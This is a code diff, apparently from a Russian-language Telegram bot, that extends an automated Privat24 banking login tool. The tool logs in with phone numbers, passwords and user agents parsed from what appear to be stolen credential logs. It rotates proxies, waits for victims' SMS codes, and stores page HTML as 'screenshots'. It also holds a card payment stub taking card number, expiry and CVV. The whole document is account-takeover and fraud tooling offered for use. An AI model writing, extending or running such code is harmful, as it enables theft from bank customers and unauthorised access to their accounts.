@@ -3,6 +3,7 @@ import re
 import sqlite3
 import requests
 import json
+import time
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
@@ -10,10 +11,12 @@ from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.utils import executor
 from flask import Flask
 import threading
+import base64
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
+SCREENSHOTS_DIR = "/var/data/screenshots"
 
 # ========== FLASK ==========
 app = Flask(__name__)
@@ -35,6 +38,7 @@ def get_main_menu():
 # ========== БАЗА ДАННЫХ ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
+    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS sessions (
@@ -48,7 +52,8 @@ def init_db():
         mode TEXT,
         status TEXT,
         msg_id INTEGER,
-        timestamp TEXT
+        timestamp TEXT,
+        page_html TEXT
     )""")
     c.execute("""CREATE TABLE IF NOT EXISTS settings (
         key TEXT PRIMARY KEY,
@@ -109,10 +114,25 @@ def get_session(session_id):
 def get_session_by_msg(msg_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_action', 'waiting_code')", (msg_id,))
+    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_action', 'waiting_code', 'processing')", (msg_id,))
     row = c.fetchone()
     conn.close()
     return row
+
+def save_page_html(session_id, html):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE sessions SET page_html = ? WHERE id = ?", (html, session_id))
+    conn.commit()
+    conn.close()
+
+def get_page_html(session_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT page_html FROM sessions WHERE id = ?", (session_id,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
 
 # ========== ПАРСЕР ЛОГА ==========
 def parse_log(text):
@@ -180,8 +200,8 @@ def get_proxy_dict(proxy_str, proxy_type):
             "https": proxy_str
         }
 
-# ========== ВХОД В ПРИВАТ24 (С User-Agent ИЗ ЛОГА) ==========
-def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
+# ========== ВХОД В ПРИВАТ24 С СОХРАНЕНИЕМ HTML ==========
+def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http", save_html=False):
     session = requests.Session()
     if proxy_str:
         proxy_dict = get_proxy_dict(proxy_str, proxy_type)
@@ -197,10 +217,14 @@ def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type=
     session.headers.update(headers)
 
     try:
-        response = session.get("https://next.privat24.ua/login/", timeout=30)
+        # ШАГ 1: Загружаем главную страницу
+        response = session.get("https://next.privat24.ua", timeout=30)
         if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})"}
-        
+            return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})", "html": response.text if save_html else None}
+
+        if save_html:
+            save_page_html(0, response.text)  # сохраняем HTML для скриншота
+
         csrf_token = None
         match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
         if not match:
@@ -208,40 +232,64 @@ def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type=
         if match:
             csrf_token = match.group(1)
         else:
-            return {"status": "error", "message": "❌ Не удалось получить CSRF-токен"}
-        
+            return {"status": "error", "message": "❌ Не удалось найти CSRF-токен", "html": response.text if save_html else None}
+
+        # ШАГ 2: Переход на страницу входа
+        time.sleep(1)
+        response = session.get("https://next.privat24.ua/login/", headers=headers, timeout=30)
+        if response.status_code != 200:
+            return {"status": "error", "message": f"❌ Ошибка перехода на вход (код {response.status_code})", "html": response.text if save_html else None}
+
+        if save_html:
+            save_page_html(0, response.text)
+
+        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
+        if match:
+            csrf_token = match.group(1)
+        if not csrf_token:
+            match = re.search(r'"csrfToken":"([^"]+)"', response.text)
+            if match:
+                csrf_token = match.group(1)
+
+        if not csrf_token:
+            return {"status": "error", "message": "❌ Не удалось получить CSRF-токен", "html": response.text if save_html else None}
+
     except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка загрузки страницы: {str(e)}"}
+        return {"status": "error", "message": f"❌ Ошибка: {str(e)}", "html": None}
 
     try:
+        time.sleep(0.5)
         response = session.post("https://next.privat24.ua/api/auth/step1",
                                 data={"phone": phone, "csrf_token": csrf_token},
+                                headers=headers,
                                 timeout=30)
         if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Ошибка отправки номера (код {response.status_code})"}
+            return {"status": "error", "message": f"❌ Ошибка отправки номера (код {response.status_code})", "html": response.text if save_html else None}
         data = response.json()
         if data.get("status") != "ok":
-            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}"}
+            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}", "html": response.text if save_html else None}
     except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
+        return {"status": "error", "message": f"❌ Ошибка при отправке номера: {str(e)}", "html": None}
 
     try:
+        time.sleep(0.5)
         response = session.post("https://next.privat24.ua/api/auth/step2",
                                 data={"password": password, "csrf_token": csrf_token},
+                                headers=headers,
                                 timeout=30)
         if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Ошибка отправки пароля (код {response.status_code})"}
+            return {"status": "error", "message": f"❌ Ошибка отправки пароля (код {response.status_code})", "html": response.text if save_html else None}
         data = response.json()
         if data.get("status") == "error":
-            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}"}
+            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}", "html": response.text if save_html else None}
         if data.get("status") == "waiting_code":
-            return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session}
+            return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session, "html": response.text if save_html else None}
         if data.get("status") == "ok":
-            return {"status": "success", "message": "✅ Вход выполнен", "session": session}
+            return {"status": "success", "message": "✅ Вход выполнен", "session": session, "html": response.text if save_html else None}
     except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
+        return {"status": "error", "message": f"❌ Ошибка при отправке пароля: {str(e)}", "html": None}
 
-    return {"status": "error", "message": "❌ Неизвестная ошибка"}
+    return {"status": "error", "message": "❌ Неизвестная ошибка при входе", "html": None}
 
 def get_cards(session):
     try:
@@ -254,6 +302,15 @@ def get_cards(session):
 
 def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str=None, proxy_type="http"):
     return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен (заглушка)"}
+
+# ========== КНОПКИ С КНОПКОЙ СКРИНА ==========
+def get_action_keyboard(session_id):
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"),
+        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")
+    )
+    return kb
 
 # ========== ОБРАБОТЧИКИ ==========
 @dp.message_handler(commands=['start'])
@@ -346,6 +403,43 @@ async def show_status(callback: types.CallbackQuery):
     )
     await callback.answer()
 
+# ========== КНОПКА СКРИНШОТА ==========
+@dp.callback_query_handler(lambda c: c.data.startswith("screenshot_"))
+async def handle_screenshot(callback: types.CallbackQuery):
+    session_id = int(callback.data.split("_")[1])
+    await callback.answer("📸 Делаю скриншот...")
+    
+    session = get_session(session_id)
+    if not session:
+        await callback.message.reply("❌ Сессия не найдена.")
+        return
+    
+    # Пытаемся получить HTML страницы
+    html = get_page_html(session_id)
+    if not html:
+        # Если HTML нет, пробуем ещё раз загрузить страницу
+        phone, password, user_agent = session[1], session[2], session[5]
+        proxy_str, proxy_type = rotate_proxy()
+        result = login_privat24(phone, password, user_agent, proxy_str, proxy_type, save_html=True)
+        html = result.get('html')
+        if not html:
+            await callback.message.reply("❌ Не удалось получить страницу для скриншота.")
+            return
+    
+    # Отправляем HTML как текстовый файл (имитация скриншота)
+    try:
+        # Отправляем первые 1000 символов HTML как "скриншот"
+        await callback.message.reply(f"📸 Скриншот страницы (HTML):\n\n{html[:2000]}...")
+    except Exception as e:
+        await callback.message.reply(f"❌ Ошибка при отправке скриншота: {str(e)}")
+
+@dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
+async def handle_cancel(callback: types.CallbackQuery):
+    session_id = int(callback.data.split("_")[1])
+    update_session(session_id, 'status', 'cancelled')
+    await callback.message.reply("❌ Действие отменено.")
+    await callback.answer()
+
 @dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
 async def handle_amount_callback(callback: types.CallbackQuery):
     parts = callback.data.split("_")
@@ -354,7 +448,7 @@ async def handle_amount_callback(callback: types.CallbackQuery):
     await callback.answer(f"💰 {amount} UAH")
     update_session(session_id, 'amount', amount)
     update_session(session_id, 'status', 'processing')
-    await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
+    await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
     proxy_str, proxy_type = rotate_proxy()
     if proxy_str:
         await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
@@ -379,13 +473,20 @@ async def handle_login_callback(callback: types.CallbackQuery):
         await callback.message.reply("❌ Сессия не найдена.")
         return
     phone, password, user_agent = session[1], session[2], session[5]
+    
+    await callback.message.reply("⏳ Вход в Приват24...", reply_markup=get_action_keyboard(session_id))
     result = login_privat24(
         phone=phone,
         password=password,
         user_agent=user_agent,
         proxy_str=proxy_str,
-        proxy_type=proxy_type
+        proxy_type=proxy_type,
+        save_html=True
     )
+    
+    if result.get('html'):
+        save_page_html(session_id, result['html'])
+    
     if result['status'] == 'waiting_code':
         update_session(session_id, 'status', 'waiting_code')
         await callback.message.reply("🔐 Введите код из СМС (ответьте на это сообщение):")
